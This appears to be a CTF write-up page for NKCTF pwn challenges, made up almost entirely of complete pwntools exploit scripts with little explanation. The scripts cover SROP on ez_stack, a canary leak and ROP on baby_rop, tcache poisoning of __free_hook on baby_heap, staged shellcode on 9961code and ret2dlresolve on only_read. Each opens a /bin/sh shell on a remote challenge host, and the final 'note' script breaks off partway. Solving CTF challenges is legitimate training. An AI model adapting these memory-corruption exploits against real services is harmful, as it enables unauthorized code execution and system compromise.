class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./ez_stack&#x27;</span>)<br>context.binary=e<br>ax_f=<span class="hljs-number">0x401146</span><br>syscall=<span class="hljs-number">0x40114e</span><br>bss=e.bss(<span class="hljs-number">0x400</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./ez_stack&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn&#x27;</span>,<span class="hljs-string">&#x27;39605&#x27;</span>)<br><br>sig=SigreturnFrame()<br>sig.rax=<span class="hljs-number">0</span><br>sig.rip=syscall<br>sig.rdi=<span class="hljs-number">0</span><br>sig.rsi=bss<br>sig.rdx=<span class="hljs-number">0x200</span><br>sig.rsp=bss+<span class="hljs-number">8</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(ax_f)+p64(syscall)+flat(sig)<br><br>p.sendafter(<span class="hljs-string">&#x27;NKCTF!\n&#x27;</span>,payload)<br><br>sig1=SigreturnFrame()<br>sig1.rax=<span class="hljs-number">59</span><br>sig1.rdi=bss<br>sig1.rsi=<span class="hljs-number">0</span><br>sig1.rdx=<span class="hljs-number">0</span><br>sig1.rsp=bss+<span class="hljs-number">0x200</span><br>sig1.rip=syscall<br><br>payload1=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(ax_f)+p64(syscall)+flat(sig1)<br>p.send(payload1)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="baby-rop">baby_rop</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>debug=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> debug==<span class="hljs-number">1</span>:<br>        p=process(<span class="hljs-string">&quot;./nkctf_message_boards&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn:31457&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br><br>        e=ELF(<span class="hljs-string">&quot;nkctf_message_boards&quot;</span>)<br>        func=<span class="hljs-string">&#x27;puts&#x27;</span><br>        func_got=e.got[func]<br>        puts=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>        rdi=<span class="hljs-number">0x00401413</span><br>        leave=<span class="hljs-number">0x40138a</span><br>        bss=e.bss(<span class="hljs-number">0x200</span>)<br>        read=<span class="hljs-number">0x401351</span><br>        main=e.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>        ret=<span class="hljs-number">0x00401434</span><br>        <span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401318\nbp 0x40138a&#x27;)</span><br>        p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">b&#x27;%41$p&#x27;</span>)<br>        p.readuntil(<span class="hljs-string">&#x27;Hello, &#x27;</span>)<br>        canary=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;What&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br>        n=<span class="hljs-number">0x30</span><br>        pad=<span class="hljs-string">b&#x27;a&#x27;</span>*n<br>        payload=pad+p64(ret)*<span class="hljs-number">13</span>+p64(rdi)+p64(func_got)+p64(puts)+p64(main)<br>        payload=payload.ljust(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>        payload+=p64(canary)<br>        p.sendafter(<span class="hljs-string">&#x27;NKCTF: &#x27;</span>,payload)<br>        p.readuntil(<span class="hljs-string">&#x27;carefully.\n&#x27;</span>)<br>        d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>        <span class="hljs-keyword">if</span> debug==<span class="hljs-number">1</span>:<br>            libc=ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.33.so&quot;</span>)<br>            libc.address=d-libc.sym[func]<br>            system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>            bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br>            gdb.attach(p)<br>        <span class="hljs-keyword">else</span>:<br>            libc=LibcSearcher(func,d)<br>            system=libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>            bin_sh=libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><br>        payload=p64(ret)*<span class="hljs-number">0x1a</span>+p64(rdi)+p64(bin_sh)+p64(system)+p64(main)<br>        payload+=p64(ret)<br>        payload+=p64(canary)<br><br>        p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">b&#x27;%41$p&#x27;</span>)<br>        p.sendafter(<span class="hljs-string">&#x27;NKCTF: &#x27;</span>,payload)<br><br>        p.interactive()<br>    <span class="hljs-keyword">except</span>:<br><br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        p.close()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><h2 id="baby-heap">baby_heap</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.32.so&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.33.so&#x27;)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;content: &#x27;</span>,data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn&#x27;</span>,<span class="hljs-string">&#x27;32973&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-number">0x88</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    free(i)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x48</span>)<br>edit(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>show(<span class="hljs-number">7</span>)<br><br>pause()<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))&amp;<span class="hljs-number">0xffffffffffffff00</span><br>main_area=d-<span class="hljs-number">0x60</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>malloc_hook=main_area-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">6</span>-i,<span class="hljs-number">0x88</span>)<br>show(<span class="hljs-number">1</span>)<br><br>heap_1_c=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap=calc_fd(heap_1_c,<span class="hljs-number">0x2a0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>pause()<br><br>pad=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x58</span>+p64(<span class="hljs-number">0x91</span>)+<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">1</span>,pad)<br>edit(<span class="hljs-number">2</span>,pad)<br>edit(<span class="hljs-number">3</span>,pad)<br><br>pad1=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">b&#x27;\xf1&#x27;</span><br>edit(<span class="hljs-number">0</span>,pad1)<br>free(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xe8</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br><br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x88</span>+p64(<span class="hljs-number">0x91</span>)+p64(enc_fd(heap+<span class="hljs-number">0x290</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x10</span>,free_hook))+<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">1</span>,payload)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;/bin/sh\x00\n&#x27;</span>)<br><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x88</span>)<br>edit(<span class="hljs-number">3</span>,p64(system)+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="9961code">9961code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>sh=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,r15</span><br><span class="hljs-string">and esi,edi</span><br><span class="hljs-string">mov dx,0xf</span><br><span class="hljs-string">add eax,0x30</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov esi,edi</span><br><span class="hljs-string">xor edi,edi</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>sh1=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">add edx,0x30</span><br><span class="hljs-string">mov ax,0</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>sh2=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov edi,0x9961020</span><br><span class="hljs-string">    xor rsi,rsi</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov ax,0x3b</span><br><span class="hljs-string">    syscall&quot;&quot;&quot;</span><br><br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(asm(sh)))<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:32041&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp main+294&#x27;)</span><br><span class="hljs-comment">#p=remote(&quot;node2.yuzhian.com.cn:30693&quot;)</span><br>pause()<br>p.sendafter(<span class="hljs-string">&#x27;shellcode&#x27;</span>,asm(sh))<br>pause()<br>p.sendline(asm(sh1))<br>pause()<br>p.sendline(asm(sh2).ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="only-read">only_read</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>read=<span class="hljs-number">0x4013d0</span><br>leave=<span class="hljs-number">0x4013e7</span><br>ret=<span class="hljs-number">0x4013e8</span><br><span class="hljs-keyword">from</span> mcrypt <span class="hljs-keyword">import</span> *<br><br><br>c=[<span class="hljs-string">b&quot;Welcome to NKCTF!\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;tell you a secret:\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;I&#x27;M RUNNING ON GLIBC 2.31-0ubuntu9.9\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;can you find me?\x00&quot;</span>]<br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:31146&quot;</span>)<br>base=b64()<br>base.setbase(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-built_in">print</span>(i)<br>    p.sendline(base.encode(i))<br>    pause()<br><br>rel=<span class="hljs-number">0x4005d8</span><br><span class="hljs-comment">#str_t=0x3ff388</span><br><span class="hljs-comment">#sym=0x3ff420</span><br>sym=<span class="hljs-number">0x4003d0</span><br>str_t=<span class="hljs-number">0x4004c0</span><br>bss=<span class="hljs-number">0x404900</span>+<span class="hljs-number">0xc0</span>*<span class="hljs-number">8</span>+<span class="hljs-number">0x40</span>+<span class="hljs-number">0x20</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br>sym_ind=<span class="hljs-number">905</span><br>func_got=e.got[<span class="hljs-string">&#x27;memset&#x27;</span>]<br><br>rdi=<span class="hljs-number">0x00401683</span><br>rel_add=bss+<span class="hljs-number">6</span>*<span class="hljs-number">0x8</span>+<span class="hljs-number">0x18</span><br>sym_add=bss+<span class="hljs-number">6</span>*<span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rel_add))<br><br>gogo=<span class="hljs-number">0x401039</span><br><span class="hljs-comment">#p.interactive()</span><br><br>pad=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span><br>pad_n=<span class="hljs-number">3</span><br>bin_sh=bss<br>system=bss+<span class="hljs-number">0x28</span><br>str_=<span class="hljs-string">b&#x27;/bin/sh\x00\x00system\x00&#x27;</span><br>sym_=p32(system-str_t)+p64(<span class="hljs-number">12</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>rel_=p64(bss-<span class="hljs-number">0x30</span>)+p32(<span class="hljs-number">7</span>)+p32((sym_add-sym)//<span class="hljs-number">0x18</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br><br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401039&#x27;)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rel_add-rel))<br><br><br><br>payload2=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span><br>payload2+=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+p64(rdi)+p64(bin_sh)+p64(gogo)+p64((rel_add-rel)//<span class="hljs-number">0x18</span>+<span class="hljs-number">1</span>)<br>payload2+=<span class="hljs-string">b&quot;system\x00\x00&quot;</span><br>payload2+=sym_+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+rel_<br><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(bss)+p64(read)<br>p.sendline(payload)<br>pause()<br><br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="note">note</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">&quot; &quot;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    